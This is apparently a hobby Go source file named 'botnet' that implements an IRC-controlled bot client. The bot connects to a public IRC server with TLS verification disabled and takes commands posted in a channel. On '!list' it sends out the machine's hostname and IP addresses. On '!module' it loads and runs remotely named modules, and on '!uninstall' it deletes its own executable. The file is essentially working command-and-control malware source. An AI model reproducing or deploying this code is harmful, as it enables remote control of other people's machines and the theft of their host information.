package botnet

import (
	"os"
	"net"
	"log"
	"time"
	"strings"
	"crypto/tls"
	"math/rand"

	"github.com/thoj/go-ircevent"
	modules "github.com/crazyboycjr/module"
)

const channel = "#cjr-random"; //TODO change to #cjr-botnet
const serverssl = "chat.freenode.net:7000"
var ircnick string

func genNick() string {
	ret := "bot-"
	for i := 1; i <= 10; i++ {
		ret += string(rand.Intn(26) + 97)
	}
	return ret
}

func collectInfo() string {
	var info string
	name, err := os.Hostname()
	info += "Hostname: "
	if err != nil {
		log.Println("get hostname info failed:", err)
		info += err.Error()
	}
	info += name + "\n"

	ifaces, err := net.Interfaces()
	if err != nil {
		log.Println("get net interfaces failed:", err)
		return info
	}
	info += "ip: "
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			log.Println("get local addr failed:", err)
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
					ip = v.IP
			case *net.IPAddr:
					ip = v.IP
			}
			log.Println("one of the ip is ", ip)
			if ip.IsGlobalUnicast() {
				info += ip.String() + ";"
			}
		}
	}
	info += "\n"
	return info
}

func botListInfo(ircconn *irc.Connection, receiver string) {
	info := "irc nickname: " + ircnick + "\n"
	info = collectInfo()
	log.Println("local info = ", info)
	log.Println("receiver = ", receiver)
	for _, line := range strings.Split(info, "\n") {
		ircconn.Privmsg(receiver, line)
	}
}

// send 10000 + 1 stop command will lock the program
var stopChan chan int = make(chan int, 10000)

func botLoadModule(msg string) {
	snips := strings.Split(strings.TrimSpace(msg), " ")
	err := modules.LoadModule(stopChan, snips[0], snips[1:])
	if err != nil {
		log.Println(err)
	}
}

// This function is untested XXX
func botUninstall() {
	file, err := os.Executable()
	if err != nil {
		log.Println("get executable fail:", err)
	}
	err = os.Remove(file)
	if err != nil {
		log.Println("remove file fail:", err)
	}
	defer os.Exit(0)
}

func botStop() {
	stopChan <- 1
	// usr some dirty method in order to ensure no duplicated stop
	go func() {
		time.Sleep(time.Second)
		for len(stopChan) > 0 {
			<-stopChan
		}
	}()
}

func botInit() {
	ircnick = genNick()
	irccon := irc.IRC(ircnick, ircnick)
	//irccon.VerboseCallbackHandler = true
	irccon.Debug = true
	irccon.UseTLS = true
	irccon.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	irccon.AddCallback("001", func(e *irc.Event) { irccon.Join(channel) })
	irccon.AddCallback("366", func(e *irc.Event) { })

	irccon.AddCallback("PRIVMSG", func(event *irc.Event) {
		go func(event *irc.Event) {
			msg := event.Message()
			log.Println("recv msg", msg)
			if len(msg) > 7 && msg[:7] == "!module" {
				go botLoadModule(msg[7:])
			} else {
				switch msg {
					case "!list":
						go botListInfo(irccon, channel)
					case "!stop":
						go botStop()
					case "!uninstall":
						botUninstall()
				}
			}
		}(event)
	})

	err := irccon.Connect(serverssl)
	if err != nil {
		log.Printf("irc connect error %s", err)
		return
	}
	irccon.Loop()
}
